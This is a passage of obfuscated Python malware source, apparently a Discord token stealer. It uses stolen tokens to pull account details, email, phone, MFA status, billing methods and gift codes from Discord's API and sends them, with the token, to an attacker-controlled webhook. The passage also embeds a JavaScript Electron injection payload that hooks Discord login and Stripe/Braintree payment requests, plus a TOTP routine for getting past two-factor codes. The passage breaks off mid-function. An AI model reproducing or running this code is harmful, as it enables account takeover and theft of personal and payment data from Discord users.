                color=UNOJDNHEAGYTOMXWQKLCRQRKXEJGNXBSZSEMJYENYNIBOLJFVTFWFUXPOCZBXKVTZZBNPHZYPQ)
            NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV.set_footer(text=CCSVHPAVPVWFHDMNWIECAIKJKTEBVENVWINJUCIWZLBDPZILRQYSGFRURVFU, icon_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)
            CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE.send(embed=NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV, username=NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF, avatar_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)
            return
        
        for SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW_d15c0rd in SZRMZNEALHDWODNSYYWYLMGETLRFNKOFPALGXFWLFDZLNKFEHSGJKKOWKPJAHUTHMWDUBCWQSJFQUJLXGAWHRXCKPBCHHUAK:
            GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW_d15c0rd}).json()

            IUJQTRZNYEUQNRNKIBAPQVXHRWCZKPXEKNOIUXMCFZTCMVIFAVJLCMLEIQTXXFQLDQPGOYLQLVVKWCZNXUKVUMPQZJ = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('username', "None") + '#' + GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('discriminator', "None")
            JHFHXAOBOOAIDUNEVDTZQJHSKNJVQWVWJNTTCAMILRAOUOWWYQIUUFDCUXBHRVHYERFHWGJXMHJYNTJZIEHUCMOTNMPTYLXSBKU = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('global_name', "None")
            WMRHUAPLNKRAKPPRIHLKUKWYRNSWLSBOYVHKJYQZLSATWIMSZCDSTMEIZPVHDSNQVXMVQFGNIAACFFOTXL = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('id', "None")
            XCOCFDARXVPRBMQSLXYLEOJIEOXMBUKDWHOTUCQMATJGWFUZOUDNZ = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('email', "None")
            ZRJYSQVCINBPETXXBLCUDGWIUZRSOOAWZJUZDJLQNFYIEIBFRRTQAVZTBDJRZNZDFOQXOOR = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('verified', "None")
            MFFLIFPDQNYOJNGXBDQFDWBWWNENAZAJMBBSGOMKWZVRNNEBTRDHDXBPFMAJGOCMZLZQRQOAIISVFQQRQGVNRHBVLVD = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('phone', "None")
            RFTZLTERRGRWAUCQBMOJUTWLRWDKXQAZQMFXKFKQIJRGBDGWJGVMNYAOGJRPXJEH = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('locale', "None")
            LYJARYAKMZXYNBSCSXDNJYUOTQZBIKZTCRZTVNSWRLPIZMEEUAABYRUMGWXEI = GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('mfa_enabled', "None")

            try:
                if GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('premium_type', 'None') == 0:
                    TBWTYEBDQINUPSZQMAQJFETIGDXOSSSRGQQXJTYYSDUBRPYABGCVKSVLVJLFDXUDQJOLXWOM = 'False'
                elif GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('premium_type', 'None') == 1:
                    TBWTYEBDQINUPSZQMAQJFETIGDXOSSSRGQQXJTYYSDUBRPYABGCVKSVLVJLFDXUDQJOLXWOM = 'Nitro Classic'
                elif GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('premium_type', 'None') == 2:
                    TBWTYEBDQINUPSZQMAQJFETIGDXOSSSRGQQXJTYYSDUBRPYABGCVKSVLVJLFDXUDQJOLXWOM = 'Nitro Boosts'
                elif GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ.get('premium_type', 'None') == 3:
                    TBWTYEBDQINUPSZQMAQJFETIGDXOSSSRGQQXJTYYSDUBRPYABGCVKSVLVJLFDXUDQJOLXWOM = 'Nitro Basic'
                else:
                    TBWTYEBDQINUPSZQMAQJFETIGDXOSSSRGQQXJTYYSDUBRPYABGCVKSVLVJLFDXUDQJOLXWOM = 'False'
            except:
                TBWTYEBDQINUPSZQMAQJFETIGDXOSSSRGQQXJTYYSDUBRPYABGCVKSVLVJLFDXUDQJOLXWOM = "None"

            try: 
                BNQAJDCLGQZIVCBMYVCBUSKRJIRLTPCPKRWHIORFDBMOCCNEYGAPVUYEQBTQFKQMQSIMRYYMJTCRPISIPPNBLKGGKVQCFDHAI = f"https://cdn.discordapp.com/avatars/{WMRHUAPLNKRAKPPRIHLKUKWYRNSWLSBOYVHKJYQZLSATWIMSZCDSTMEIZPVHDSNQVXMVQFGNIAACFFOTXL}/{GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{WMRHUAPLNKRAKPPRIHLKUKWYRNSWLSBOYVHKJYQZLSATWIMSZCDSTMEIZPVHDSNQVXMVQFGNIAACFFOTXL}/{GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{WMRHUAPLNKRAKPPRIHLKUKWYRNSWLSBOYVHKJYQZLSATWIMSZCDSTMEIZPVHDSNQVXMVQFGNIAACFFOTXL}/{GOLVKZHDDCGDCJGGGTGXXBDUQRRKPVEFRGCUBJSWVHOGAWCLZSCHUESCTGZZEXCUCYGAMUPTBGUTXXNSQ['avatar']}.png"
            except: 
                BNQAJDCLGQZIVCBMYVCBUSKRJIRLTPCPKRWHIORFDBMOCCNEYGAPVUYEQBTQFKQMQSIMRYYMJTCRPISIPPNBLKGGKVQCFDHAI = GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD

            try:
                STTCNBORRTFWXFCUDNVBWMOYULMCLEWUQYAHMWZTKOPSNXBTOHTVEAWSRRGUYFDSHPYJKPMEFZMH = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW_d15c0rd}).json()
                if STTCNBORRTFWXFCUDNVBWMOYULMCLEWUQYAHMWZTKOPSNXBTOHTVEAWSRRGUYFDSHPYJKPMEFZMH:
                    HUBAUBNUCDTXETKUMBELZVYFDBYHHYBGCQQMJLHGXNCNXSOQJMSSVHDULQHIQEQJXRKDSPZJGTIQHFFJSWTIYDIMBBNZSRWU = []

                    for v4r_method in STTCNBORRTFWXFCUDNVBWMOYULMCLEWUQYAHMWZTKOPSNXBTOHTVEAWSRRGUYFDSHPYJKPMEFZMH:
                        if v4r_method['type'] == 1:
                            HUBAUBNUCDTXETKUMBELZVYFDBYHHYBGCQQMJLHGXNCNXSOQJMSSVHDULQHIQEQJXRKDSPZJGTIQHFFJSWTIYDIMBBNZSRWU.append('CB')
                        elif v4r_method['type'] == 2:
                            HUBAUBNUCDTXETKUMBELZVYFDBYHHYBGCQQMJLHGXNCNXSOQJMSSVHDULQHIQEQJXRKDSPZJGTIQHFFJSWTIYDIMBBNZSRWU.append("Paypal")
                        else:
                            HUBAUBNUCDTXETKUMBELZVYFDBYHHYBGCQQMJLHGXNCNXSOQJMSSVHDULQHIQEQJXRKDSPZJGTIQHFFJSWTIYDIMBBNZSRWU.append('Other')
                    HUBAUBNUCDTXETKUMBELZVYFDBYHHYBGCQQMJLHGXNCNXSOQJMSSVHDULQHIQEQJXRKDSPZJGTIQHFFJSWTIYDIMBBNZSRWU = ' / '.join(HUBAUBNUCDTXETKUMBELZVYFDBYHHYBGCQQMJLHGXNCNXSOQJMSSVHDULQHIQEQJXRKDSPZJGTIQHFFJSWTIYDIMBBNZSRWU)
                else:
                    HUBAUBNUCDTXETKUMBELZVYFDBYHHYBGCQQMJLHGXNCNXSOQJMSSVHDULQHIQEQJXRKDSPZJGTIQHFFJSWTIYDIMBBNZSRWU = "None"
            except:
                HUBAUBNUCDTXETKUMBELZVYFDBYHHYBGCQQMJLHGXNCNXSOQJMSSVHDULQHIQEQJXRKDSPZJGTIQHFFJSWTIYDIMBBNZSRWU = "None"

            try:
                HHRFBVDRPDSDBQHFNNYYSENOOKOVPWIGYBGNTTAQVNFANWIPFYWCLYIL = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW_d15c0rd}).json()
                if HHRFBVDRPDSDBQHFNNYYSENOOKOVPWIGYBGNTTAQVNFANWIPFYWCLYIL:
                    ZTRDDRXHDUZPSBUGDCNQBNXDNMJVNGUEVSIYHEIGOKUDRRXTECEJJZONWHMEIHYJNMULDIBVOGEQJRNODQIVWDQSDQYTJTSEF = []
                    for FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG in HHRFBVDRPDSDBQHFNNYYSENOOKOVPWIGYBGNTTAQVNFANWIPFYWCLYIL:
                        VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR = FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG['promotion']['outbound_title']
                        FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG = FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG['code']
                        MNBHUQCBWZOVAIAOKSUXUFSAHUSJDMLNUYQLUINGLJCJYJMUNODLIQSTMT = f"Gift: {VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR}\nCode: {FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG}"
                        if len('\n\n'.join(FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG)) + len(MNBHUQCBWZOVAIAOKSUXUFSAHUSJDMLNUYQLUINGLJCJYJMUNODLIQSTMT) >= 1024:
                            break
                        ZTRDDRXHDUZPSBUGDCNQBNXDNMJVNGUEVSIYHEIGOKUDRRXTECEJJZONWHMEIHYJNMULDIBVOGEQJRNODQIVWDQSDQYTJTSEF.append(MNBHUQCBWZOVAIAOKSUXUFSAHUSJDMLNUYQLUINGLJCJYJMUNODLIQSTMT)
                    if len(ZTRDDRXHDUZPSBUGDCNQBNXDNMJVNGUEVSIYHEIGOKUDRRXTECEJJZONWHMEIHYJNMULDIBVOGEQJRNODQIVWDQSDQYTJTSEF) > 0:
                        FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG = '\n\n'.join(ZTRDDRXHDUZPSBUGDCNQBNXDNMJVNGUEVSIYHEIGOKUDRRXTECEJJZONWHMEIHYJNMULDIBVOGEQJRNODQIVWDQSDQYTJTSEF)
                    else:
                        FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG = "None"
                else:
                    FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG = "None"
            except:
                FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG = "None"
        
            v4r_software_name, LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR = TNAAEYHPRJPXJRBYRSWGNLCLMJXCTGKOQSVAWMJOMIGRVPONRYFCJSTIYWWILXQYZDPZUQAZYK.get(SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW_d15c0rd, ("Unknown Software", "Unknown location"))

            embed = Embed(title=f'Discord Token `{WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ} "{ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}"`:', color=UNOJDNHEAGYTOMXWQKLCRQRKXEJGNXBSZSEMJYENYNIBOLJFVTFWFUXPOCZBXKVTZZBNPHZYPQ)      
            embed.add_field(name=":file_folder: Path:", value=f"```{LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR}```", inline=True)
            embed.add_field(name=":globe_with_meridians: Token:", value=f"```{SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW_d15c0rd}```", inline=True)
            embed.add_field(name=":package: Software:", value=f"```{v4r_software_name}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Username:", value=f"```{IUJQTRZNYEUQNRNKIBAPQVXHRWCZKPXEKNOIUXMCFZTCMVIFAVJLCMLEIQTXXFQLDQPGOYLQLVVKWCZNXUKVUMPQZJ}```", inline=True)
            embed.add_field(name=":bust_in_silhouette: Display Name:", value=f"```{JHFHXAOBOOAIDUNEVDTZQJHSKNJVQWVWJNTTCAMILRAOUOWWYQIUUFDCUXBHRVHYERFHWGJXMHJYNTJZIEHUCMOTNMPTYLXSBKU}```", inline=True)
            embed.add_field(name=":robot: Id:", value=f"```{WMRHUAPLNKRAKPPRIHLKUKWYRNSWLSBOYVHKJYQZLSATWIMSZCDSTMEIZPVHDSNQVXMVQFGNIAACFFOTXL}```", inline=True)
            embed.add_field(name=":e_mail: Email:", value=f"```{XCOCFDARXVPRBMQSLXYLEOJIEOXMBUKDWHOTUCQMATJGWFUZOUDNZ}```", inline=True)
            embed.add_field(name=":white_check_mark: Email Verified:", value=f"```{ZRJYSQVCINBPETXXBLCUDGWIUZRSOOAWZJUZDJLQNFYIEIBFRRTQAVZTBDJRZNZDFOQXOOR}```", inline=True)
            embed.add_field(name=":telephone_receiver: Phone:", value=f"```{MFFLIFPDQNYOJNGXBDQFDWBWWNENAZAJMBBSGOMKWZVRNNEBTRDHDXBPFMAJGOCMZLZQRQOAIISVFQQRQGVNRHBVLVD}```", inline=True)   
            embed.add_field(name=":rocket: Nitro:", value=f"```{TBWTYEBDQINUPSZQMAQJFETIGDXOSSSRGQQXJTYYSDUBRPYABGCVKSVLVJLFDXUDQJOLXWOM}```", inline=True)
            embed.add_field(name=":earth_africa: Language:", value=f"```{RFTZLTERRGRWAUCQBMOJUTWLRWDKXQAZQMFXKFKQIJRGBDGWJGVMNYAOGJRPXJEH}```", inline=True)
            embed.add_field(name=":moneybag: Billing:", value=f"```{HUBAUBNUCDTXETKUMBELZVYFDBYHHYBGCQQMJLHGXNCNXSOQJMSSVHDULQHIQEQJXRKDSPZJGTIQHFFJSWTIYDIMBBNZSRWU}```", inline=True)
            embed.add_field(name=":gift: Gift Code:", value=f"```{FMVFZQSDAETVHICBTIQDTIKKTHDMPSZUDWZIAXZZWMNMMEXZWOEKZZOKXAOGSAEJFBFMWJBIKIFSHPESLAG}```", inline=True)
            embed.add_field(name=":lock: Multi-Factor Authentication:", value=f"```{LYJARYAKMZXYNBSCSXDNJYUOTQZBIKZTCRZTVNSWRLPIZMEEUAABYRUMGWXEI}```", inline=True)
            embed.add_field(name=":frame_photo: Profile Picture:", value=f"", inline=False)
            embed.set_image(url=BNQAJDCLGQZIVCBMYVCBUSKRJIRLTPCPKRWHIORFDBMOCCNEYGAPVUYEQBTQFKQMQSIMRYYMJTCRPISIPPNBLKGGKVQCFDHAI)
            embed.set_footer(text=CCSVHPAVPVWFHDMNWIECAIKJKTEBVENVWINJUCIWZLBDPZILRQYSGFRURVFU, icon_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)
            CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE.send(embed=embed, username=NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF, avatar_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)

    upload_t0k3n5()

CMKUOETNSZIFLMSBVKWQPEWORWYTBWJCHEYSIEFYAPHCTXASPWBWBOMUEQMFPKLRIUHEDLWDZBTY = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
